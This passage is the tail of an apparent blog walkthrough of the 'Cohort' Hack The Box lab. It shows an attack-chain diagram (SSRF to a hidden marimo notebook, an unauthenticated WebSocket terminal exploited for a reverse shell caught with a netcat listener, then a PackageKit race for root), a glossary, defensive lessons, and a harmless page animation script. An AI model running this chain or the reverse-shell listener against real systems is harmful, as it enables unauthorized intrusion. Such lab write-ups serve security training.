+      │  Internal request → discovers hidden subdomain
+      ▼
+[nb-1be3782a8afd3ad5.cohort.htb]
+      │
+      │  whatweb → Title: marimo
+      │  marimo = Python notebook with /terminal/ws endpoint
+      │  CVE-2026-39987 → WebSocket terminal has NO auth
+      ▼
+[WebSocket RCE]
+      │
+      │  python3 cve.py → sends reverse shell payload
+      │  rlwrap nc -lvnp 4444 → catches the shell
+      ▼
+[marimo@cohort — uid=1000]
+      │
+      │  cat user.txt → 🚩 User Flag
+      │
+      │  linPEAS → PackageKit 1.2.8-2ubuntu1.2
+      │  CVE-2026-41651 → TOCTOU race condition
+      │  ./root → SUID bash written by root
+      ▼
+[euid=0(root)]
+      │
+      │  cat /root/root.txt → 🚩 Root Flag
+      ▼
+[Box Owned]
+</code></pre><h2 id="concept-summary--key-terms-explained">Concept Summary — Key Terms Explained</h2><table><thead><tr><th>Term</th><th>Simple Definition</th></tr></thead><tbody><tr><td><strong>Nmap</strong></td><td>Network scanner — tells you what ports and services are open on a machine</td></tr><tr><td><strong>TTL</strong></td><td>Packet lifetime counter — helps guess the OS (Linux ≈ 63, Windows ≈ 127)</td></tr><tr><td><strong>Wildcard subdomain (<code>*.</code>)</strong></td><td>Certificate/DNS entry covering all subdomains — hints there are more surfaces to find</td></tr><tr><td><strong>Virtual hosting</strong></td><td>One IP serves multiple websites based on the <code>Host:</code> header you send</td></tr><tr><td><strong>SSRF</strong></td><td>Making a server fetch URLs on your behalf — lets you reach internal services</td></tr><tr><td><strong>SSRF bypass</strong></td><td>Alternate URL notations (<code>127.1</code>, <code>0.0.0.0</code>) that evade blocklist filters</td></tr><tr><td><strong>WebSocket</strong></td><td>Persistent bidirectional connection — used for real-time apps like browser terminals</td></tr><tr><td><strong>CVE</strong></td><td>Numbered identifier for a known, documented security vulnerability</td></tr><tr><td><strong>Reverse shell</strong></td><td>Victim machine connects <em>back to you</em> — bypasses inbound firewall rules</td></tr><tr><td><strong>PTY / pty.spawn</strong></td><td>Pseudo-terminal — makes your shell behave like a real interactive terminal</td></tr><tr><td><strong>setsid</strong></td><td>Creates a new process session, detaching from the parent — prevents shell death</td></tr><tr><td><strong>Privilege escalation</strong></td><td>Moving from low-privilege user to root/admin</td></tr><tr><td><strong>linPEAS</strong></td><td>Automated Linux privilege escalation enumeration script</td></tr><tr><td><strong>PackageKit</strong></td><td>Linux package manager service — runs as root</td></tr><tr><td><strong>TOCTOU</strong></td><td>Race condition: swap something between when it’s checked and when it’s used</td></tr><tr><td><strong>SUID</strong></td><td>File permission: run this executable with the owner’s privileges (owner = root = root shell)</td></tr><tr><td><strong>euid</strong></td><td>Effective User ID — the actual privilege level you have right now</td></tr><tr><td><strong>LPE</strong></td><td>Local Privilege Escalation — requires existing access, then gets root</td></tr></tbody></table><h2 id="key-security-lessons">Key Security Lessons</h2><h2 id="1-ssrf-can-expose-hidden-infrastructure-the-subdomain-was-invisible-to-public-scans-but-reachable-via-ssrf-internal-services-should-never-be-discoverable-via-external-user-controlled-requests-network-segmentation-and-blocking-ssrf-at-the-wafproxy-layer-prevents-this---2-developer-tools-should-never-be-internet-facing-marimos-terminal-is-designed-for-local-developer-use-exposing-terminalws-publicly--even-authenticated--is-risky-unauthenticated-is-catastrophic-internal-tools-need-network-level-isolation-not-just-application-level-auth---3-software-versions-matter-packagekit-128-2ubuntu12-was-vulnerable-128-2ubuntu15-is-patched-a-difference-of-three-minor-package-revisions-is-the-difference-between-a-secure-system-and-full-root-compromise-keep-systems-updated-and-use-vulnerability-scanners-to-catch-these-gaps---4-race-conditions-are-hard-to-eliminate-toctou-flaws-are-among-the-hardest-bugs-to-fix--the-window-can-be-microseconds-wide-proper-fixes-usually-involve-atomic-operations-file-locking-flock-or-moving-the-verification-after-the-action-rather-than-before"><strong>1. SSRF Can Expose Hidden Infrastructure</strong> The subdomain was invisible to public scans but reachable via SSRF. Internal services should never be discoverable via external user-controlled requests. Network segmentation and blocking SSRF at the WAF/proxy layer prevents this. <strong>2. Developer Tools Should Never Be Internet-Facing</strong> Marimo’s terminal is designed for local developer use. Exposing <code>/terminal/ws</code> publicly — even authenticated — is risky. Unauthenticated is catastrophic. Internal tools need network-level isolation, not just application-level auth. <strong>3. Software Versions Matter</strong> PackageKit 1.2.8-2ubuntu1.2 was vulnerable; 1.2.8-2ubuntu1.5 is patched. A difference of three minor package revisions is the difference between a secure system and full root compromise. Keep systems updated and use vulnerability scanners to catch these gaps. <strong>4. Race Conditions Are Hard to Eliminate</strong> TOCTOU flaws are among the hardest bugs to fix — the window can be microseconds wide. Proper fixes usually involve atomic operations, file locking (<code>flock</code>), or moving the verification <em>after</em> the action rather than before.</h2></div><footer class="content__footer"><div class="entry-wrapper"><p class="content__updated">This article was updated on September 30, 2026</p><div class="content__actions"><ul class="content__tag"><li><a href="https://h4ck3rfirst.github.io/tags/cohort/">cohort</a></li><li><a href="https://h4ck3rfirst.github.io/tags/cve-2026-39987/">CVE-2026-39987</a></li><li><a href="https://h4ck3rfirst.github.io/tags/cve-2026-41651/">CVE-2026-41651</a></li><li><a href="https://h4ck3rfirst.github.io/tags/easy/">Easy</a></li><li><a href="https://h4ck3rfirst.github.io/tags/nmap/">Nmap</a></li><li><a href="https://h4ck3rfirst.github.io/tags/ssrf/">ssrf</a></li></ul><div class="content__share"><button class="btn--icon content__share-button js-content__share-button"><svg width="20" height="20" aria-hidden="true"><use xlink:href="https://h4ck3rfirst.github.io/assets/svg/svg-map.svg#share"></use></svg> <span>Share It</span></button><div class="content__share-popup js-content__share-popup"><a href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Fh4ck3rfirst.github.io%2Fcohort%2F" class="js-share linkedin" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://h4ck3rfirst.github.io/assets/svg/svg-map.svg#linkedin"/></svg> <span>LinkedIn</span> </a><a href="https://buffer.com/add?text=Cohort&amp;url=https%3A%2F%2Fh4ck3rfirst.github.io%2Fcohort%2F" class="js-share buffer" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://h4ck3rfirst.github.io/assets/svg/svg-map.svg#buffer"/></svg> <span>Buffer</span> </a><a href="https://api.whatsapp.com/send?text=Cohort https%3A%2F%2Fh4ck3rfirst.github.io%2Fcohort%2F" class="js-share whatsapp" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://h4ck3rfirst.github.io/assets/svg/svg-map.svg#whatsapp"/></svg> <span>WhatsApp</span></a></div></div></div><div class="content__bio bio"><div><h3 class="h4 bio__name"><a href="https://h4ck3rfirst.github.io/authors/h4ck3rfirst/" rel="author">h4ck3rfirst</a></h3></div></div></div><nav class="content__nav"><div class="wrapper"><div class="content__nav-inner"><div class="content__nav-prev"><a href="https://h4ck3rfirst.github.io/tryhackme-operation-endgame-walkthrough/" class="content__nav-link" rel="prev"><div><span>Previous</span> Tryhackme Operation Endgame Walkthrough </div></a></div></div></div></nav></footer></article></main><footer class="footer footer--glued"><div class="wrapper"><div class="footer__copyright"><h6>Documenting the world of bug bounties, pentesting, and security engineering one lab at a time.</h6><p class="align-center">© 2026 h4ck3rfirst . Built with 😊.</p></div><button id="backToTop" class="footer__bttop" aria-label="Back to top" title="Back to top"><svg width="20" height="20"><use xlink:href="https://h4ck3rfirst.github.io/assets/svg/svg-map.svg#toparrow"/></svg></button></div></footer><script defer="defer" src="https://h4ck3rfirst.github.io/assets/js/scripts.min.js?v&#x3D;dafec4f87fead6718cb125f0b0fc8441"></script><script>window.publiiThemeMenuConfig={mobileMenuMode:'sidebar',animationSpeed:300,submenuWidth: 'auto',doubleClickTime:500,mobileMenuExpandableSubmenus:true,relatedContainerForOverlayMenuSelector:'.top'};</script><script>var images = document.querySelectorAll('img[loading]');
+        for (var i = 0; i < images.length; i++) {
+            if (images[i].complete) {
+                images[i].classList.add('is-loaded');
+            } else {
+                images[i].addEventListener('load', function () {
+                    this.classList.add('is-loaded');
+                }, false);
+            }
+        }</script><script>(function () {
+    "use strict";
+
+    const space = document.getElementById("publii-space-dust");
+
+    if (!space) return;
+
+    /* ================================
+       SETTINGS
+       ================================ */
+
+    const STAR_COUNT = 1200;
+
+    /*
+     * Approximately 2 cm on a typical desktop display.
+     * CSS pixels are not physically exact across monitors,
+     * so this is an approximate interaction radius.
+     */
+    const MOUSE_RADIUS = 75;
+
+    /* How fast the dust moves */
+    const MIN_SPEED = 0.99;
+    const MAX_SPEED = 2.99;
+
+    /* How often stars twinkle */
+    const MIN_TWINKLE = 0.9;
+    const MAX_TWINKLE = 2.8;
+
+    /* ================================
+       VARIABLES
+       ================================ */
+
+    const stars = [];
+    let mouseX = -9999;
+    let mouseY = -9999;
+    let animationFrame;
+
+    const glow = document.getElementById(
+        "publii-space-mouse-glow"
+    );
+
+    /* ================================
+       RANDOM HELPERS
+       ================================ */
+
+    function random(min, max) {
+        return Math.random() * (max - min) + min;
+    }
+
+    function clamp(value, min, max) {
+        return Math.max(min, Math.min(max, value));
+    }
+
+    /* ================================
+       CREATE STARS
+       ================================ */
+
+    for (let i = 0; i < STAR_COUNT; i++) {
+
+        const star = document.createElement("span");
+
+        star.className = "publii-star";
+
+        /*
+         * Most particles are tiny.
+         * A few are slightly larger.
+         */
+        const sizeChance = Math.random();
+
+        let size;
+
+        if (sizeChance > 0.992) {
+            size = random(3.0, 4.5);
+            star.classList.add("big");
+        } else if (sizeChance > 0.96) {
+            size = random(1.8, 3.2);
+        } else if (sizeChance > 0.82) {
+          // Normal stars
+    	size = random(1.0, 1.8);
+		} else {
+    	// Tiny space dust
+    	size = random(0.4, 1.1);
+		}
+
+        star.style.width = size + "px";
+        star.style.height = size + "px";
+
+        const x = Math.random() * window.innerWidth;
+        const y = Math.random() * window.innerHeight;
+
+        star.style.left = x + "px";
+        star.style.top = y + "px";
+
+        /*
+         * Each particle gets its own direction
+         * and speed so the background feels like dust.
+         */
+        const angle = random(0, Math.PI * 2);
+
+        const speed = random(
+            MIN_SPEED,
+            MAX_SPEED
+        );
+
+        /*
+         * Twinkle timing
+         */
+        const twinkleDuration = random(
+            MIN_TWINKLE,
+            MAX_TWINKLE
+        );
+
+        const twinkleDelay = random(
+            0,
+            MAX_TWINKLE
+        );
+
+        star.style.animation =
+            "publiiStarTwinkle " +
+            twinkleDuration +
+            "s ease-in-out " +
+            twinkleDelay +
+            "s infinite";
+
+        /*
+         * Store particle information.
+         */
+        stars.push({
+            element: star,
+
+            x: x,
+            y: y,
+
+            vx: Math.cos(angle) * speed,
+            vy: Math.sin(angle) * speed,
+
+            baseOpacity: random(0.25, 0.9),
+
+            size: size
+        });
+
+        space.appendChild(star);
+    }
+
+    /* ================================
+       ADD TWINKLE ANIMATION
+       ================================ */
+
+    const style = document.createElement("style");
+
+    style.textContent = `
+        @keyframes publiiStarTwinkle {
+            0%, 100% {
+                opacity: 0.08;
+            }
+
+            25% {
+                opacity: 0.35;
+            }
+
+            50% {
+                opacity: 1;
+            }
+
+            75% {
+                opacity: 0.4;
+            }
+        }
+    `;
+
+    document.head.appendChild(style);
+
+    /* ================================
+       MOUSE
+       ================================ */
+
+    window.addEventListener(
+        "mousemove",
+        function (event) {
+
+            mouseX = event.clientX;
+            mouseY = event.clientY;
+
+            if (glow) {
+                glow.style.left = mouseX + "px";
+                glow.style.top = mouseY + "px";
+            }
+        },
+        { passive: true }
+    );
+
+    /*
+     * Remove mouse interaction when
+     * pointer leaves the browser window.
+     */
+    document.addEventListener(
+        "mouseleave",
+        function () {
+            mouseX = -9999;
+            mouseY = -9999;
+        }
+    );
+
+    /* ================================
+       TOUCH
+       ================================ */
+
+    window.addEventListener(
+        "touchmove",
+        function (event) {
+
+            if (!event.touches.length) return;
+
+            mouseX = event.touches[0].clientX;
+            mouseY = event.touches[0].clientY;
+
+            if (glow) {
+                glow.style.left = mouseX + "px";
+                glow.style.top = mouseY + "px";
+            }
+        },
+        { passive: true }
+    );
+
+    /* ================================
+       ANIMATION
+       ================================ */
+
+    function animate() {
+
+        const width = window.innerWidth;
+        const height = window.innerHeight;
+
+        for (let i = 0; i < stars.length; i++) {
+
+            const star = stars[i];
+
+            /*
+             * Move dust
+             */
+            star.x += star.vx;
+            star.y += star.vy;
+
+            /*
+             * Wrap around screen edges
+             */
+            if (star.x < -10) {
+                star.x = width + 10;
+            }
+
+            if (star.x > width + 10) {
+                star.x = -10;
+            }
+
+            if (star.y < -10) {
+                star.y = height + 10;
+            }
+
+            if (star.y > height + 10) {
+                star.y = -10;
+            }
+
+            /*
+             * Move particle
+             */
+            star.element.style.transform =
+                "translate3d(" +
+                star.x +
+                "px," +
+                star.y +
+                "px,0)";
+        }
+
+        animationFrame = requestAnimationFrame(animate);
+    }
+
+    animate();
+
+    /* ================================
+       MOUSE CONNECTIONS
+       ================================ */
+
+    /*
+     * Instead of permanently creating 800 lines,
+     * we create them only when needed.
+     */
+
+    let lastLineUpdate = 0;
+
+    function updateConnections(timestamp) {
+
+        /*
+         * Limit line calculations to about 30fps.
+         * This keeps 800 particles smooth.
+         */
+        if (timestamp - lastLineUpdate < 33) {
+            requestAnimationFrame(updateConnections);
+            return;
+        }
+
+        lastLineUpdate = timestamp;
+
+        /*
+         * Delete old connection lines.
+         */
+        const oldLines =
+            space.querySelectorAll(
+                ".publii-star-line"
+            );
+
+        oldLines.forEach(function (line) {
+            line.remove();
+        });
+
+        /*
+         * No mouse = no connections.
+         */
+        if (mouseX < 0 || mouseY < 0) {
+            requestAnimationFrame(updateConnections);
+            return;
+        }
+
+        /*
+         * Find stars close to mouse.
+         */
+        for (let i = 0; i < stars.length; i++) {
+
+            const star = stars[i];
+
+            const dx = star.x - mouseX;
+            const dy = star.y - mouseY;
+
+            const distance =
+                Math.sqrt(dx * dx + dy * dy);
+
+            if (distance <= MOUSE_RADIUS) {
+
+                /*
+                 * Only connect fairly close stars
+                 * to the mouse.
+                 */
+                const line =
+                    document.createElement("span");
+
+                line.className =
+                    "publii-star-line";
+
+                const angle =
+                    Math.atan2(
+                        star.y - mouseY,
+                        star.x - mouseX
+                    ) * 180 / Math.PI;
+
+                line.style.left =
+                    mouseX + "px";
+
+                line.style.top =
+                    mouseY + "px";
+
+                line.style.width =
+                    distance + "px";
+
+                line.style.transform =
+                    "rotate(" + angle + "deg)";
+
+                /*
+                 * Closer = brighter.
+                 */
+                const opacity =
+                    1 - distance / MOUSE_RADIUS;
+
+                line.style.opacity =
+                    (opacity * 0.7).toFixed(2);
+
+                space.appendChild(line);
+            }
+        }
+
+        requestAnimationFrame(updateConnections);
+    }
+
+    requestAnimationFrame(updateConnections);
+
+    /* ================================
+       RESIZE
+       ================================ */
+
+    window.addEventListener(
+        "resize",
+        function () {
+
+            /*
+             * Keep stars inside the new viewport.
+             */
+            const width = window.innerWidth;
+            const height = window.innerHeight;
+
+            stars.forEach(function (star) {
+
+                if (star.x > width) {
+                    star.x = Math.random() * width;
+                }
+
+                if (star.y > height) {
+                    star.y = Math.random() * height;
+                }
+            });
+        }
+    );
+
+    /* ================================
+       CLEANUP
+       ================================ */
+
+    window.addEventListener(
+        "pagehide",
+        function () {
+            cancelAnimationFrame(animationFrame);
+        }
+    );
+
+})();</script></body></html>
